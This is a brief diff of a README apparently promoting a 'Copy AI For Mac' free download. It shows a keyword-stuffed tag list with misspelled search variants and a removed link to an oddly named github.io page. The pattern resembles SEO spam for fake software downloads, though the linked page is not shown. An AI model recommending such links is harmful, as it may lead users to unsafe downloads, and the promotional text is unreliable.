@@ -68,4 +68,3 @@ By combining user-friendly design with powerful AI capabilities, Copy AI For Mac
 ## 🔍 Tags
 
 copy ai, ai copy copy artificial intelligence, copys ai, cppy ai, cop y ai, copy ai+, ai copywriting, copywriting ai, copy ai for mac, copy ai mac, copy ai mac download, copy ai free, copy ai download, download copy ai, copy ai for mac, copy ai discount, copy ai for macos, copy ai mac free, copy ai mac free download, copy ai free download
-](https://fituganshfgh.github.io/.github/copyai)
